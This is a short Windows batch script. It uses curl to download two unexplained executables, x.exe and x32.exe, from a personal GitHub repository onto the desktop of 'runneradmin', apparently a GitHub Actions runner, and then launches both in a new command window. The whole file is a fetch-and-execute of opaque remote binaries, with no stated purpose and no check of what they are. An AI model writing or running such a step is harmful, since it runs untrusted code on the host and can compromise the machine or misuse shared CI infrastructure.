@echo off
REM Download x.exe and x32.exe using curl
curl -L -o "C:\Users\runneradmin\Desktop\x.exe" "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.exe"
curl -L -o "C:\Users\runneradmin\Desktop\x32.exe" "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x32.exe"

REM Open a new Command Prompt window, go to Desktop, and execute x.exe and x32.exe
start cmd /k "cd /d C:\Users\runneradmin\Desktop && echo Executing x.exe && start x.exe && echo Executing x32.exe && start x32.exe"
